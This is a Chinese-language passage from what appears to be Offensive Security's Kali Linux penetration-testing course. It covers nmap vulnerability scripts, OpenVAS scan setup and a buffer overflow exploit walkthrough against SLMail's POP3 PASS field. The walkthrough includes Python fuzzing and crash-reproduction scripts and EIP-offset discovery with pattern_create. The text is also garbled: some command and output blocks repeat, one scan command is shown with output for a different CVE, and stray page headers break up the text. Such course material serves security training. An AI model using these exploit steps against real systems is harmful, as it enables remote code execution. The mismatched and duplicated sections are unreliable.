
# 使用 Kali Linux 进行渗透测试

```bash
root@kali:~# nmap -v -p 80 139, 445 --script=smb-security-mode 192.168.11.236
```

```text
Nmap scan report for 192.168.11.236.
Host is up (0.10s latency).
PORT STATE SERVICE
139/tcp open netbios-ss

Host results:
| smb-security-mode: |
| Account that was used for smb scripts: guest |
| Share-level authentication (dangerous) |
| SMB Security: Challenge/response supported |
| Message signing disabled (dangerous, by default) |
```

除了渗透测试外，网络管理员还可以利用 NSE 脚本验证服务器是否已应用补丁。例如，你可以使用 `nmap` 验证所有 Web 服务器是否修复了 `CVE-2011-3192`。

```bash
root@kali:~# nmap -v -p 80 --script=http-vuln-cve2011-3192 192.168.11.205-210
```

```text
...

Nmap scan report for 192.168.11.208

Host is up (0.19s latency).

PORT STATE SERVICE

80/tcp open http
| http-vuln-cve2010-2861: |
| VULNERABLE: |
| AdobeFusion Directory Traversal Vulnerability | |
| State: VULNERABLE (Exploitable) | |
| IDS: OSVDB:67047 CVE:CVE-2010-2861 | |
| Description: Multiple directory traversal vulnerabilities in the administrator console in Adobe Fusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter | |
| Disclosure date: 2010-08-10 | |
| Extra information: | |
| CFusionMX | Not vulnerable |
| Jrun4servers | Not vulnerable |
| ColdFusion8 | HAC: 44E6EF036B348S22E9F72ED6BB19A6BE9867A42C | |
| Salt: 137146192224 | |
```

```bash
Hash: AAFDC23870ECBCD3D55B86423A9892134E17927E\CFusionMX7
Not vulnerable
```

```bash
root@kali:~# nmap -v p 21 --script=ftp-anon.nse 192.168.11.200-254
```

```bash
root@kali:~# nmap -v -p 80 139, 445 --script=smb-security-mode 192.168.11.236
```

```bash
root@kali:~# nmap -v -p 80 --script=http-vuln-cve2011-3192 192.168.11.205-210
```

> ⁴ https://web.nist.gov/view/vuln?vulnId=CVE-2011-3192

## 使用 Kali Linux 进行渗透测试

```text
80/tcp open http
| http-vuln-cve2010-2861: |
| VULNERABLE: |
| AdobeFusion Directory Traversal Vulnerability | |
| State: VULNERABLE (Exploitable) | |
| IDS: OSVDB:67047 CVE:CVE-2010-2861 | |
| Description: Multiple directory traversal vulnerabilities in the administrator console in Adobe Fusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter | |
| Disclosure date: 2010-08-10 | |
| Extra information: | |
| CFusionMX | Not vulnerable |
| Jrun4servers | Not vulnerable |
| ColdFusion8 | HAC: 44E6EF036B348S22E9F72ED6BB19A6BE9867A42C | |
| Salt: 137146192224 | |
```

## 使用 Kali Linux 进行渗透测试

## OFFENSIVE security

www.offensive-security.com

使用 Kali Linux 进行渗透测试

# 攻击性安全

www.offensive-security.com

# 使用 Kali Linux 进行渗透测试

在使用 `OpenVAS` 运行首次漏洞扫描之前，我们需要配置一个目标。目标可以是单个 IP 地址，也可以是一个主机范围，如下所示。

| 名称 | subnet-1 |
| --- | --- |
| 注释（可选） | -- |
| 主机 | 192.168.1.0/24 |
| 端口列表 | 所有 IANA 分配 TCP 2012-02-10 |
| SSH 凭据（可选） | -- |
| SMB 凭据（可选） | -- |

图 29 - 配置新目标

# 使用 Kali Linux 进行渗透测试

配置好目标后，我们可以使用内置的扫描配置之一创建一个新的扫描任务，如下所示。

| 新任务 | | |
| --- | --- | --- |
| 名称 | First_Scan | | |
| 注释（可选） | [ ] | |
| 扫描配置 | Full and fast | * |
| 扫描目标 | subnet-1 | * |
| 升级器（可选） | -- | * |
| 计划（可选） | -- | * |
| 从机（可选） | [ ] | * |
| | [ 取消 ] [ 创建 ] | |

图 30 - 创建新任务

# 使用 Kali Linux 进行渗透测试

新任务不会自动启动，因此我们需要手动运行任务并等待漏洞扫描完成。根据你的系统资源，漏洞扫描可能需要很长时间才能完成。

扫描完成后，可以在“报告”（Reports）选项卡下找到扫描报告。由于我们的首次扫描是在没有凭据的情况下进行的，发现的漏洞数量相当少，因为它无法查询目标上安装的软件或其他需要身份验证的漏洞。

## 漏洞

## 5.2.2 - 练习

1. 使用 `nmap` 脚本和 `OpenVAS` 对目标网络中的系统进行针对性扫描（针对单个主机）。
2. 使用 `iptables` 统计流量。从网络带宽和时间来看，扫描单个主机需要多少资源？
3. 考虑扫描器会识别哪些漏洞。该工具的局限性是什么？

# 缓冲区溢出

缓冲区溢出是我们课程中最感兴趣的话题之一。本模块将带你了解缓冲区溢出开发生命周期的实例，然后介绍当利用程序用于在受害者机器远程执行代码时发生的各个阶段。在讨论缓冲区溢出时，产生的问题包括“这些是如何发现的？”以及“你如何知道 X 字节会导致应用程序崩溃？”通常情况下，识别应用程序缺陷有三种主要方法。如果应用程序源码可用，那么源码审计可能是简单的方法。如果应用程序是封闭的，你可以使用逆向工程或模糊测试（fuzzing）。

模糊测试涉及向输入发送畸形数据并观察是否崩溃。意外崩溃表明应用程序可能没有正确过滤输入。这可能导致发现可利用的漏洞。

## 6.1 - 漏洞历史

缓冲区溢出发现于 2005 年，`SLMail` 软件编译时没有数据执行保护（DEP）和地址布局随机化（ASLR），这使得利用过程变得简单。由于我们将在 Windows 7 上利用漏洞，我们需要意识到微软引入的某些内存保护，特别是数据执行保护（DEP）和地址布局随机化（ASLR）。

- **DEP** 是一套硬件和软件技术，它们对内存进行额外的检查，通过在执行时抛出异常来帮助防止恶意代码在系统上运行。
- **ASLR** 在每次操作系统启动时都会随机化加载的应用程序和 DLL 的基地址。

### 6.1.3 - 与 POP3 协议交互

我们选择 `SLMail` 作为示例的原因之一是它可以与明文 `POP3` 协议进行简单通信。早些，我们在使用 `netcat` 与 `POP3` 服务器通信时看到过这个例子。然而，如果我们不知道协议格式，我们需要查找该协议的 RFC 文档，或者使用 `Wireshark` 等工具自行学习。为了使用 Python 脚本重现课程之前执行的 `netcat` 连接，我们的代码看起来如下。

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print("\nSending buffer...")
    s.connect(('10.0.0.22', 110)) # 连接到 IP，POP3 端口
    data = s.recv(1024) # 接收 banner
    print data # 打印 banner

    s.send("USER test" + "\r\n") # 发送用户名 "test"
    data = s.recv(1024) # 接收回复
    print data # 打印回复

    s.send("PASS test" + "\r\n") # 发送密码 "test"
    data = s.recv(1024) # 接收回复
    print data # 打印回复

    s.close() # 关闭 socket
    print("\nDone!")
except:
    print "Could not connect to POP3!"
```

获取这个简单的脚本并修改它以在登录过程中对密码字段进行模糊测试很容易的。生成的脚本看起来如下。

```python
#!/usr/bin/python
import socket

# 创建一个缓冲区数组，从 10 到 2000，增量为 20。
buffer=["A"]
counter=100
while len(buffer) <= 30:
    buffer.append("A"*counter)
    counter=counter+200

for string in buffer:
    print("Fuzzing PASS with %s bytes" % len(string))
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect=s.connect(('10.0.0.22', 110))
    s.send('USER test\r\n')
    s.recv(1024)
    s.send('PASS ' + string + '\r\n')
    s.send('QUIT\r\n')

s.close()
```

针对你的 `SLMail` 实例运行此脚本，并附加到 `Immunity Debugger`，应该产生类似下面的输出。

```text
root@kali:~ # ./fuzzer.py
fuzzing PASS with 1 bytes
...
```

我们的 `PASS` 缓冲区长度达到约 2700 字节，之前的截图显示扩展指令指针（`EIP`）寄存器已被我们输入的 `A` 字符缓冲区所覆盖（字母 `A` 的十六进制表示为 `\x41`）。这对我们来说特别感兴趣，因为 `EIP` 控制应用程序的流。这意味着如果我们仔细构造漏洞利用缓冲区（`exploit buffer`），我们就可以将程序的执行流转移到我们选择的地方，例如内存中的某个位置，我们可以那里作为缓冲区的一部分引入一些反向 shell 代码（`reverse shell code`）。

在这个特定的窗口中，另一个值得注意的地址是崩溃时扩展堆栈指针（`ESP`）¹⁶ 的值。我们将在下一节中引用此值。

> ¹⁶ http://en.wikipedia.org/wiki/ESP_register#32-bit

### 6.1.4 - 练习

1. 对 `SLmail` 进行 Fuzz 测试并重现崩溃。
2. 在 `SLmail` 崩溃时检查栈中的内存。它看起来是什么样子的？考虑这可能有什么用。

# 7. - Win32 缓冲区溢出利用

## 7.1 - 重现崩溃

从我们的模糊器（`fuzzer`）中，我们可以推断出当发送一个包含约 2700 字节密码的 `PASS` 命令时，`SLMail` 存在缓冲区溢出漏洞。我们在利用过程中的首要任务是编写一个简单的脚本来重现观察到的崩溃，而无需每次运行模糊器。我们的脚本看起来如下：

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A' * 2700
try:
    print ("nSending buffer...")
    s.connect(('10.0.0.22',110))
    data = s.recv(1024)
    s.send('USER username ' + '\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print ("nDone!")
except:
    print ("Could not connect to POP3!")
```

## 7.2 - 控制 EIP

获取 `EIP` 寄存器的控制权是漏洞开发的关键步骤。`EIP` 寄存器就像是马缰。向左拉会让应用程序向一个方向运行，而向右拉则会让它向另一个方向运行。因此，在缓冲区中找到 4 个覆盖我们 `EIP` 寄存器的 `A` 至关重要。实现此点的有两种常用方法：

### 7.2.1 - 二进制树分析

与其发送 2700 个 `A`，不如发送 1350 个 `B`。如果 `EIP` 被 `B` 覆盖，我们就知道四个字节位于缓冲区的后半部分。然后我们将 1350 个 `B` 改为 675 个 `B` 和 675 个 `C`，并再次发送缓冲区。如果 `EIP` 被 `C` 覆盖，我们就知道四个字节位于 2000-2700 范围内。我们继续分割特定的缓冲区，直到找到覆盖 `EIP` 的精确四个字节。从数学上讲，这应该在七次迭代内完成。

### 7.2.2 - 发送唯一字符串

识别这四个字节更快的方法是发送一个 2700 字节的唯一字符串，识别出覆盖 `EIP` 的 4 个字节，然后在我们的唯一缓冲区中定位这四个字节。`pattern_create.rb` 是一个用于创建和定位此类缓冲器的 Ruby 工具，可以在 `Metasploit Framework` 漏洞开发脚本的一部分找到。

```bash
root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb
root@kali:~#/usr/share/metasploit-framework/tools/pattern_create.rb 2700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3A
```

将此缓冲区代替我们的 2700 个 `A` 放入我们的 Python 利用脚本中，将产生一个类似于下图所示的 EIP 覆盖。请注意下一次崩溃中的 **ESP** 和 **EIP** 寄存器值。

...

## 寄存器 (FPU)

| 寄存器 | 值 | ASCII |
|---|---|---|
| EAX | 00000000 | |
| ECX | 02639EC4 | "13/04/06 09:12:52 P3 |
| EDX | 00000000 | |
| EBX | 00000004 | |
| ESP | 0263A128 | "Dj0Dj1d2j2Dj3dj4j5j6 |
| EBP | 69443769 | |
| ESI | 00000000 | |
| EDI | 00000001 | |
| EIP | 39694438 | |
